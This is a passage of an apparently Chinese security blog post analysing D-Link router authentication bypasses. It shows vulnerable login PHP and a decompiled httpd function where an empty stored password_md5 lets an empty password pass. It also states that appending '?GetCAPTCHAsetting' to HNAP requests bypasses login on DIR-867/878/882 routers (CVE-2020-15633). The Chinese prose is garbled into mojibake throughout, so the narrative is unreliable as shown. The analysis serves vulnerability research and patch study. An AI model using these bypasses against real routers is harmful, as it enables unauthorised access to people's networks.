class="variable">$LOGIN_USER</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/pass&quot;</span>,     <span class="variable">$password_noenc</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/acc_per&quot;</span>,	<span class="variable">$acc_per</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/private_key&quot;</span>,	<span class="variable">$private_key</span>);</span><br><span class="line">							<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/password_md5&quot;</span>,	<span class="variable">$password_md5</span>);</span><br><span class="line">							<span class="comment">//login access delete hamc</span></span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/private_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/password_md5&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/challenge&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/public_key&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/time&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>.<span class="string">&quot;/session_uid&quot;</span>);</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$hmac_md5_path</span>);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">							<span class="title function_ invoke__">unlink</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_username&quot;</span>,<span class="variable">$LOGIN_USER</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/wlan/inf:1/radiusclient_password&quot;</span>,<span class="variable">$LOGIN_PASSWD</span>);</span><br><span class="line">			<span class="title function_ invoke__">set</span>(<span class="string">&quot;/runtime/web/sub_str&quot;</span>,<span class="string">&quot;RADIUSCLIENT&quot;</span>);</span><br><span class="line">			<span class="variable">$user_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/name&quot;</span>);</span><br><span class="line">			<span class="variable">$password_d</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/password&quot;</span>);</span><br><span class="line">			<span class="variable">$group</span>=<span class="title function_ invoke__">query</span>(<span class="string">&quot;/sys/user:1/group&quot;</span>);</span><br><span class="line">			<span class="variable">$prefix</span>=<span class="string">&quot;/var/proc/web/session:&quot;</span>.<span class="variable">$sid</span>.<span class="string">&quot;/user&quot;</span>;</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/name&quot;</span>,     <span class="variable">$user_d</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/group&quot;</span>,    <span class="variable">$group</span>);</span><br><span class="line">			<span class="title function_ invoke__">fwrite</span>(<span class="variable">$prefix</span>.<span class="string">&quot;/ac_auth&quot;</span>,  <span class="string">&quot;1&quot;</span>);</span><br><span class="line">			<span class="variable">$match</span>=<span class="string">&quot;-1&quot;</span>;</span><br><span class="line">			<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;radiusclient&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>==<span class="string">&quot;1&quot;</span>)	&#123;<span class="variable">$AUTH_RESULT</span>=<span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å®é™…ä¸Šå­˜åœ¨å·®åˆ«çš„ä»£ç åªæœ‰ä¸€å¥ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ—§ç‰ˆæœ¬ï¼š</span><br><span class="line">if($LOGIN_PASSWD == $password_d)</span><br><span class="line"></span><br><span class="line">æ–°ç‰ˆæœ¬ï¼š</span><br><span class="line">if($password_d != &quot;&quot; &amp;&amp; $LOGIN_PASSWD == $password_d)</span><br></pre></td></tr></table></figure></div>

<p>æ–°ç‰ˆæœ¬ä¸­éªŒè¯äº†å˜é‡ $password_d æ˜¯å¦ä¸ºç©ºï¼Œç„¶åæ‰ä¸ $LOGIN_PASSWD è¿›è¡Œæ¯”è¾ƒã€‚</p>
<p>é‚£ä¹ˆè¿™äº›å˜é‡æ˜¯ä»å“ªé‡Œæ¥çš„å‘¢ï¼Ÿé€šè¿‡æŸ¥çœ‹ login.php ä»£ç å¯ä»¥ç¡®å®š $LOGIN_PASSWD å˜é‡æ˜¯ç”¨æˆ·è¾“å…¥çš„å¯†ç ï¼Œè€Œ $password_d ä»ä¸Šé¢çš„ä»£ç æ¥çœ‹æ˜¯ä»æ–‡ä»¶ &#x2F;var&#x2F;proc&#x2F;web&#x2F;hmac_md5&#x2F;$session_uid&#x2F;password_md5 è¯»å–çš„ã€‚</p>
<p>é€šè¿‡æœç´¢ password_md5 ï¼Œå‘ç° httpd æ–‡ä»¶ä¸­åŒ…å«æ­¤å­—ç¬¦ä¸²ï¼Œå…³é”®å‡½æ•°æ˜¯ FUN_00012bb8ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_00012bb8</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  uint __seed;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">size_t</span> sVar3;</span><br><span class="line">  uint uVar4;</span><br><span class="line">  byte *pbVar5;</span><br><span class="line">  byte *pbVar6;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  <span class="type">long</span> local_29c;</span><br><span class="line">  undefined4 local_25c;</span><br><span class="line">  undefined4 local_258;</span><br><span class="line">  undefined4 local_254;</span><br><span class="line">  undefined4 local_250;</span><br><span class="line">  undefined4 local_24c;</span><br><span class="line">  undefined4 local_248;</span><br><span class="line">  undefined4 local_244;</span><br><span class="line">  undefined4 local_240;</span><br><span class="line">  undefined4 local_23c;</span><br><span class="line">  undefined4 local_238;</span><br><span class="line">  undefined4 local_234;</span><br><span class="line">  undefined4 local_230;</span><br><span class="line">  undefined4 local_22c;</span><br><span class="line">  undefined4 local_228;</span><br><span class="line">  undefined2 uStack548;</span><br><span class="line">  undefined local_222;</span><br><span class="line">  <span class="type">char</span> acStack544 [<span class="number">88</span>];</span><br><span class="line">  undefined auStack456 [<span class="number">68</span>];</span><br><span class="line">  undefined4 local_184;</span><br><span class="line">  undefined4 local_180;</span><br><span class="line">  undefined4 local_17c;</span><br><span class="line">  undefined4 local_178;</span><br><span class="line">  undefined4 local_174;</span><br><span class="line">  undefined4 local_170;</span><br><span class="line">  undefined4 local_16c;</span><br><span class="line">  undefined4 local_168;</span><br><span class="line">  undefined local_164;</span><br><span class="line">  <span class="type">char</span> acStack352 [<span class="number">128</span>];</span><br><span class="line">  <span class="type">char</span> acStack224 [<span class="number">128</span>];</span><br><span class="line">  undefined4 local_60;</span><br><span class="line">  undefined4 local_5c;</span><br><span class="line">  undefined4 local_58;</span><br><span class="line">  undefined4 local_54;</span><br><span class="line">  undefined4 local_50;</span><br><span class="line">  undefined local_4c;</span><br><span class="line">  undefined4 local_48;</span><br><span class="line">  undefined4 local_44;</span><br><span class="line">  undefined4 local_40;</span><br><span class="line">  undefined4 local_3c;</span><br><span class="line">  undefined4 local_38;</span><br><span class="line">  undefined4 local_34;</span><br><span class="line">  undefined4 local_30;</span><br><span class="line">  undefined4 local_2c;</span><br><span class="line">  undefined4 local_28;</span><br><span class="line">  uint local_24;</span><br><span class="line">  </span><br><span class="line">  local_48 = <span class="number">0</span>;</span><br><span class="line">  local_44 = <span class="number">0</span>;</span><br><span class="line">  local_40 = <span class="number">0</span>;</span><br><span class="line">  local_3c = <span class="number">0</span>;</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_34 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_2c = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_24 = <span class="number">0</span>;</span><br><span class="line">  local_60 = <span class="number">0</span>;</span><br><span class="line">  local_5c = <span class="number">0</span>;</span><br><span class="line">  local_58 = <span class="number">0</span>;</span><br><span class="line">  local_54 = <span class="number">0</span>;</span><br><span class="line">  local_50 = <span class="number">0</span>;</span><br><span class="line">  local_4c = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(acStack224,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack352,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  local_184 = <span class="number">0</span>;</span><br><span class="line">  local_180 = <span class="number">0</span>;</span><br><span class="line">  local_17c = <span class="number">0</span>;</span><br><span class="line">  local_178 = <span class="number">0</span>;</span><br><span class="line">  local_174 = <span class="number">0</span>;</span><br><span class="line">  local_170 = <span class="number">0</span>;</span><br><span class="line">  local_16c = <span class="number">0</span>;</span><br><span class="line">  local_168 = <span class="number">0</span>;</span><br><span class="line">  local_164 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack456,<span class="number">0</span>,<span class="number">0x41</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack544,<span class="number">0</span>,<span class="number">0x56</span>);</span><br><span class="line">  local_22c = <span class="number">0</span>;</span><br><span class="line">  local_228 = <span class="number">0</span>;</span><br><span class="line">  uStack548 = <span class="number">0</span>;</span><br><span class="line">  local_222 = <span class="number">0</span>;</span><br><span class="line">  local_23c = <span class="number">0</span>;</span><br><span class="line">  local_238 = <span class="number">0</span>;</span><br><span class="line">  local_234 = <span class="number">0</span>;</span><br><span class="line">  local_230 = <span class="number">0</span>;</span><br><span class="line">  local_25c = <span class="number">0</span>;</span><br><span class="line">  local_258 = <span class="number">0</span>;</span><br><span class="line">  local_254 = <span class="number">0</span>;</span><br><span class="line">  local_250 = <span class="number">0</span>;</span><br><span class="line">  local_24c = <span class="number">0</span>;</span><br><span class="line">  local_248 = <span class="number">0</span>;</span><br><span class="line">  local_244 = <span class="number">0</span>;</span><br><span class="line">  local_240 = <span class="number">0</span>;</span><br><span class="line">  FUN_0001f460(&amp;local_25c,<span class="number">0x20</span>,<span class="string">&quot;%s/sessiontimeout&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>);</span><br><span class="line">  sysinfo((sysinfo *)&amp;local_29c);</span><br><span class="line">  iVar1 = FUN_0001f7b8(param_1,*(undefined4 *)(param_1 + <span class="number">0xbcc</span>));</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) &#123;</span><br><span class="line">    __s1 = (<span class="type">char</span> *)(param_1 + <span class="number">0x13f8</span>);</span><br><span class="line">    local_22c = <span class="number">0</span>;</span><br><span class="line">    local_228 = <span class="number">0</span>;</span><br><span class="line">    uStack548 = <span class="number">0</span>;</span><br><span class="line">    local_222 = <span class="number">0</span>;</span><br><span class="line">    FUN_0001f460(&amp;local_22c,<span class="number">10</span>,<span class="string">&quot;%s/hmac_md5/%s/session_uid&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,(<span class="type">char</span> *)&amp;local_22c);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_25c,<span class="number">0x1f</span>,<span class="string">&quot;%d&quot;</span>,local_29c);</span><br><span class="line">      FUN_0001f4f4(&amp;local_25c,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/time&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      __seed = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">      srand(__seed);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        iVar2 = rand();</span><br><span class="line">        __seed = iVar2 % <span class="number">0x3e</span>;</span><br><span class="line">        <span class="keyword">if</span> (__seed &lt; <span class="number">10</span>) &#123;</span><br><span class="line">          *(<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_48 + iVar1) = (<span class="type">char</span>)__seed + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          uVar4 = __seed - <span class="number">10</span>;</span><br><span class="line">          <span class="keyword">if</span> (uVar4 &lt; <span class="number">0x1a</span>) &#123;</span><br><span class="line">            __seed = __seed + <span class="number">0x37</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (uVar4 &lt; <span class="number">0x1a</span>) &#123;</span><br><span class="line">            *(<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_48 + iVar1) = (<span class="type">char</span>)__seed;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (__seed - <span class="number">0x24</span> &lt; <span class="number">0x1a</span>) &#123;</span><br><span class="line">              *(<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_48 + iVar1) = (<span class="type">char</span>)__seed + <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">              *(undefined *)((<span class="type">int</span>)&amp;local_48 + iVar1) = <span class="number">0x30</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar1 = iVar1 + <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">while</span> (iVar1 != <span class="number">0x28</span>);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      local_24 = local_24 &amp; <span class="number">0xffffff</span>;</span><br><span class="line">      <span class="built_in">strncpy</span>((<span class="type">char</span> *)&amp;local_60,(<span class="type">char</span> *)&amp;local_48,<span class="number">0x14</span>);</span><br><span class="line">      <span class="built_in">strncpy</span>(acStack224,(<span class="type">char</span> *)&amp;local_34,<span class="number">0x14</span>);</span><br><span class="line">      FUN_0001f4f4(&amp;local_60,<span class="number">0x14</span>,<span class="string">&quot;%s/hmac_md5/%s/challenge&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      FUN_0001f4f4(acStack224,<span class="number">0x14</span>,<span class="string">&quot;%s/hmac_md5/%s/public_key&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      FUN_0001f4f4(__s1,<span class="number">10</span>,<span class="string">&quot;%s/hmac_md5/%s/session_uid&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      FUN_00021320(auStack456,<span class="number">0x41</span>,<span class="string">&quot;/sys/user:%d/%s&quot;</span>,<span class="number">1</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;password  = %s\n&quot;</span>,auStack456);</span><br><span class="line">      <span class="built_in">snprintf</span>(acStack544,<span class="number">0x56</span>,<span class="string">&quot;%s%s&quot;</span>,acStack224,auStack456);</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;public_key_add_pass = %s\n&quot;</span>,acStack544);</span><br><span class="line">      local_23c = <span class="number">0</span>;</span><br><span class="line">      local_238 = <span class="number">0</span>;</span><br><span class="line">      local_234 = <span class="number">0</span>;</span><br><span class="line">      local_230 = <span class="number">0</span>;</span><br><span class="line">      sVar3 = <span class="built_in">strlen</span>(acStack544);</span><br><span class="line">      FUN_0001fd40(&amp;local_60,<span class="number">0x14</span>,acStack544,sVar3,&amp;local_23c);</span><br><span class="line">      pbVar5 = (byte *)((<span class="type">int</span>)&amp;local_240 + <span class="number">3</span>);</span><br><span class="line">      pbVar6 = pbVar5;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        pbVar6 = pbVar6 + <span class="number">1</span>;</span><br><span class="line">        iVar2 = <span class="built_in">sprintf</span>((<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_184 + iVar1),<span class="string">&quot;%02x&quot;</span>,(uint)*pbVar6);</span><br><span class="line">        iVar1 = iVar1 + iVar2;</span><br><span class="line">      &#125; <span class="keyword">while</span> (pbVar6 != (byte *)((<span class="type">int</span>)&amp;local_230 + <span class="number">3</span>));</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;private_key is = %s\n&quot;</span>,&amp;local_184);</span><br><span class="line">      FUN_0001f4f4(&amp;local_184,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/private_key&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      local_23c = <span class="number">0</span>;</span><br><span class="line">      local_238 = <span class="number">0</span>;</span><br><span class="line">      local_234 = <span class="number">0</span>;</span><br><span class="line">      local_230 = <span class="number">0</span>;</span><br><span class="line">      FUN_0001fd40(&amp;local_60,<span class="number">0x14</span>,&amp;local_184,<span class="number">0x20</span>,&amp;local_23c);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        pbVar5 = pbVar5 + <span class="number">1</span>;</span><br><span class="line">        iVar2 = <span class="built_in">sprintf</span>(acStack352 + iVar1,<span class="string">&quot;%02x&quot;</span>,(uint)*pbVar5);</span><br><span class="line">        iVar1 = iVar1 + iVar2;</span><br><span class="line">      &#125; <span class="keyword">while</span> (pbVar5 != (byte *)((<span class="type">int</span>)&amp;local_230 + <span class="number">3</span>));</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;password_md5 = %s\n&quot;</span>,acStack352);</span><br><span class="line">      FUN_0001f4f4(acStack352,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/password_md5&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_25c,<span class="number">0x1f</span>,<span class="string">&quot;%d&quot;</span>,local_29c);</span><br><span class="line">      FUN_0001f4f4(&amp;local_25c,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/time&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡äº¤å‰å¼•ç”¨å‘ç°è°ƒç”¨æ­¤å‡½æ•°çš„ä½ç½®æ˜¯å¤„ç† http è¯·æ±‚çš„ä¸»å‡½æ•°ï¼Œå†…å®¹è¾ƒå¤šè¿™é‡Œå°±ä¸è´´ä»£ç äº†ï¼Œå¤§æ¦‚é€»è¾‘å°±æ˜¯åŒ¹é… http è¯·æ±‚çš„å„ä¸ªå­—æ®µç„¶åé‡‡å–ä¸åŒçš„æ“ä½œï¼Œä»ä¸Šé¢çš„ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥å‘ç° password_md5 æ–‡ä»¶å†…å®¹ä¼¼ä¹æ˜¯ä»ç”¨æˆ·è¯·æ±‚ä¸­å–å¾—çš„ï¼Œæˆ‘çŒœæµ‹æ˜¯ç”¨æˆ·ç‚¹å‡»ç™»å½•æŒ‰é’®ä¹‹åä¼šé€šè¿‡ php ä»£ç è®¡ç®—å‡ºæŸäº›å¿…è¦çš„æ•°æ®ï¼Œç„¶åä¼ é€’ç»™ httpd è§£æå¹¶ä¿å­˜åˆ°å¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œä¹‹ååœ¨ __login.php ä¸­è¿›è¡ŒéªŒè¯ï¼Œè¿™æ ·æ¥çœ‹ï¼Œä¸€æ—¦ç”¨æˆ·æ‰‹åŠ¨æ¸…ç©º password_md5  å¯¹åº”å­—æ®µçš„å†…å®¹ï¼Œé‚£ä¹ˆå°†å¯¼è‡´ $password_d å˜é‡ä¸ºç©ºï¼ŒéªŒè¯å¯†ç çš„é€»è¾‘å°±å˜æˆäº†</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$LOGIN_PASSWD</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$password_d</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$LOGIN_PASSWD</span> == <span class="variable">$password_d</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡æ­£å¸¸çš„ç™»å½•éªŒè¯ï¼Œé¡ºåˆ©è¿›å…¥åå°ã€‚</p>
<p>å®˜æ–¹çš„ä¿®å¤æ‰‹æ®µå°±æ˜¯å…ˆåˆ¤æ–­ $password_d æ˜¯å¦ä¸ºç©ºï¼Œç„¶åæ‰è¿›è¡Œæ¯”è¾ƒã€‚</p>
<h1 id="CVE-2020-15633"><a href="#CVE-2020-15633" class="headerlink" title="CVE-2020-15633"></a>CVE-2020-15633</h1><p>2020 å¹´ 7 æœˆ 20 æ—¥ï¼ŒZDI æŠ«éœ²äº† Dlink DIR ç³»åˆ—è·¯ç”±å™¨çš„ä¸€ä¸ªèº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼Œæ­¤æ¼æ´å½±å“å¤šä¸ªä¸åŒçš„è·¯ç”±å™¨è®¾å¤‡ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ ç‰¹æ®Šçš„ HTTP è¯·æ±‚å³å¯è§¦å‘æ¼æ´ï¼Œç»•è¿‡ç™»å½•éªŒè¯é€»è¾‘ï¼Œç›´æ¥è®¿é—®æ•æ„Ÿæ¥å£ã€‚</p>
<h2 id="æ¼æ´åŸºæœ¬ä¿¡æ¯-2"><a href="#æ¼æ´åŸºæœ¬ä¿¡æ¯-2" class="headerlink" title="æ¼æ´åŸºæœ¬ä¿¡æ¯"></a>æ¼æ´åŸºæœ¬ä¿¡æ¯</h2><p>ä»¥ä¸‹æ˜¯ä»æŠ«éœ²é¡µé¢æ‘˜æŠ„çš„æ¼æ´ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of HNAP requests. The issue results from incorrect string matching logic when accessing protected pages. An attacker can leverage this vulnerability to escalate privileges and execute code in the context of the router.</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ¼æ´å½±å“ DIR-867, DIR-878, DIR-882 è·¯ç”±å™¨ï¼Œæ¼æ´äº§ç”ŸåŸå› å¤§æ¦‚æ˜¯åœ¨å¤„ç† HNAP è¯·æ±‚è¿‡ç¨‹ä¸­ï¼ŒéªŒè¯ç”¨æˆ·ç™»å½•çš„é€»è¾‘å­˜åœ¨é—®é¢˜ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šçš„ HTTP è¯·æ±‚ç»•è¿‡èº«ä»½éªŒè¯ï¼Œä»è€Œè®¿é—®æ•æ„Ÿ API æ¥å£ã€‚</p>
<p>æ¼æ´ç±»å‹ï¼šèº«ä»½éªŒè¯ç»•è¿‡</p>
<p>æ¼æ´å¨èƒï¼šè¾ƒé«˜ (8.8)</p>
<p>æ¼æ´å½±å“ï¼šæ”»å‡»è€…ç»•è¿‡èº«ä»½éªŒè¯ï¼Œä»è€Œè®¿é—®æ•æ„Ÿ APIï¼Œæ‰§è¡Œæ•æ„Ÿæ“ä½œã€‚</p>
<h2 id="æ¼æ´åˆ†æ-3"><a href="#æ¼æ´åˆ†æ-3" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä»¥ DIR-878 è·¯ç”±å™¨ä¸ºä¾‹ï¼Œå›ºä»¶ä¸‹è½½åœ°å€ï¼š<a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>è¯·ä¸‹è½½ 1.20B05 ç‰ˆæœ¬ï¼Œæ­¤æ¼æ´åœ¨æœ€æ–°ç‰ˆä¸­å·²ç»ä¿®å¤ã€‚</p>
<p>DIR 878 è·¯ç”±å™¨çš„å›ºä»¶ç»è¿‡åŠ å¯†ï¼Œbinwalk æ— æ³•ç›´æ¥è§£åŒ…ï¼Œè§£åŒ…æ‰‹æ®µå¯ä»¥å‚è€ƒ  <a href="https://wzt.ac.cn/2019/09/18/D-Link_BUG/">https://wzt.ac.cn/2019/09/18/D-Link_BUG/</a></p>
<p>è§£åŒ…ä¹‹åæ‰¾åˆ°å…³é”®æ–‡ä»¶ prog.cgiï¼Œæ­¤æ–‡ä»¶è´Ÿè´£è§£æå’Œå¤„ç† HTTP è¯·æ±‚ã€‚å°†å®ƒåŠ è½½åˆ° Ghidra ä¸­å³å¯å¼€å§‹åˆ†æã€‚</p>
<p>æ ¹æ®æŠ«éœ²ä¿¡æ¯ï¼Œè§¦å‘æ­¤æ¼æ´çš„æ‰‹æ®µæ˜¯åœ¨æ­£å¸¸çš„ HNAP è¯·æ±‚åé¢æ·»åŠ  â€˜?GetCAPTCHAsettingâ€™ï¼Œæ·»åŠ ä¹‹åå°†æ•°æ®åŒ…å‘é€ç»™è·¯ç”±å™¨å³å¯ç»•è¿‡èº«ä»½éªŒè¯ä»è€Œè®¿é—®ä»»æ„çš„ API æ¥å£ã€‚äºæ˜¯åˆ©ç”¨å­—ç¬¦ä¸²æœç´¢åŠŸèƒ½åœ¨ç›®æ ‡æ–‡ä»¶ä¸­æŸ¥æ‰¾å­—ç¬¦ä¸² GetCAPTCHAsettingï¼Œå¾—åˆ°å‡ æ¡äº¤å‰å¼•ç”¨ä¿¡æ¯ï¼Œå…¶ä¸­ä½äº 004d01a0 ä½ç½®çš„å­—ç¬¦ä¸²æ˜¯æˆ‘ä»¬é‡ç‚¹å…³æ³¨çš„å¯¹è±¡ã€‚</p>
<p>åŒå‡»æ¥åˆ°ç›®æ ‡åœ°å€ï¼Œå‘ç°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">                             PTR_DAT_004d0194                                XREF[3]:     FUN_0041d81c:0041d928 (R) , </span><br><span class="line">                                                                                          FUN_0041d81c:0041da04 (R) , </span><br><span class="line">                                                                                          websWriteBlockWithTranslation:00</span><br><span class="line">        004d0194 e4  48  4b  00    addr       DAT_004b48e4                                     = 23h    #</span><br><span class="line">        004d0198 00              ??         00h</span><br><span class="line">        004d0199 00              ??         00h</span><br><span class="line">        004d019a 00              ??         00h</span><br><span class="line">        004d019b 00              ??         00h</span><br><span class="line">        004d019c 00              ??         00h</span><br><span class="line">        004d019d 00              ??         00h</span><br><span class="line">        004d019e 00              ??         00h</span><br><span class="line">        004d019f 00              ??         00h</span><br><span class="line">        004d01a0 47  65  74       ds         &quot;GetCAPTCHAsetting&quot;</span><br><span class="line">                 43  41  50 </span><br><span class="line">                 54  43  48 